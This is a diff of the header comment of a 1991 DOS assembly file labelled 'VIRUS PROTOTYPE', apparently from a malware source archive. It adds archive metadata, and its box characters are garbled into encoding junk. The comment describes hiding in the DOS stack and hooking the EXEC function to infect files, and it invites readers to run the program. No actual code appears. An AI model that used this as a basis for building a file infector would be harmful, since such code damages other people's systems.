@@ -1,21 +1,32 @@
-;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
-;±									      ±
-;±			V I R U S   P R O T O T Y P E			      ±
-;±									      ±
-;±   Author	: Waleri Todorov, CICTT, (C)-Copyright 1991, All Rights Rsrvd ±
-;±   Date	: 25 Jan 1991	 21:05					      ±
-;±   Function	: Found DOS stack in put himself in it. Then trace DOS	      ±
-;±		  function EXEC and type 'Infect File'                        ±
-;±									      ±
-;±									      ±
-;±	 If you want to have fun with this program just run file STACK.COM    ±
-;±  Don't worry, this is not a virus yet, just try to find him in memory      ±
-;±  with PCTools and/or MAPMEM. If you can -> just erase the source - it is   ±
-;±  useless for you. If you can't -> you don't have to look at it - it is too ±
-;±  difficult to you to understand it.					      ±
-;±					     Best regards, Waleri Todorov     ±
-;±									      ±
-;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
+; ------------------------------------------------------------
+; name      S
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
+;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
+;ï¿½									      ï¿½
+;ï¿½			V I R U S   P R O T O T Y P E			      ï¿½
+;ï¿½									      ï¿½
+;ï¿½   Author	: Waleri Todorov, CICTT, (C)-Copyright 1991, All Rights Rsrvd ï¿½
+;ï¿½   Date	: 25 Jan 1991	 21:05					      ï¿½
+;ï¿½   Function	: Found DOS stack in put himself in it. Then trace DOS	      ï¿½
+;ï¿½		  function EXEC and type 'Infect File'                        ï¿½
+;ï¿½									      ï¿½
+;ï¿½									      ï¿½
+;ï¿½	 If you want to have fun with this program just run file STACK.COM    ï¿½
+;ï¿½  Don't worry, this is not a virus yet, just try to find him in memory      ï¿½
+;ï¿½  with PCTools and/or MAPMEM. If you can -> just erase the source - it is   ï¿½
+;ï¿½  useless for you. If you can't -> you don't have to look at it - it is too ï¿½
+;ï¿½  difficult to you to understand it.					      ï¿½
+;ï¿½					     Best regards, Waleri Todorov     ï¿½
+;ï¿½									      ï¿½
+;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 
 
 
